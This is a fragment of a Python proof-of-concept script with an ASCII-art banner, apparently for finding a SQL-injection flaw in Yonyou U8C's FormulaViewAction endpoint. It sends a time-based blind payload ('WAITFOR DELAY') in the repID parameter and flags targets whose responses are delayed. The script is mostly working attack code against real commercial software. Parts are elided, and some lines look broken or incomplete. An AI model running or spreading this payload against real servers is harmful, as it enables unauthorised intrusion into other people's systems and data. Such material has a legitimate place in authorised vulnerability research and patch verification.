               ...
               `88'       88           8888"88,     88 88   `8b  88 88      88888  
                ...
                88        88           88     "88,  88 88     `888   `"Y88888P"   
                            ...
                            888888888888 
                                        ...
                                        tag: this is a 用友-U8C-SQL注入-FormulaViewAction poc
...
def poc(target):
    if target[-1] == '/':
        ...
        target = target
    path = "/service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.FormulaViewAction&method=execute&repID=1')%20WAITFOR%20DELAY%20'0:0:5'--+&unitID=public"
    url = target + path
    headers = {
    ...
    try:
        ...
        response1 = requests.get(url=url, headers=headers, files=files, verify=False, timeout=15)

        if  response1.status_code == 200 and response1.elapsed.total_seconds() > 4:
            print(f"[++++++] {target} 存在sql")
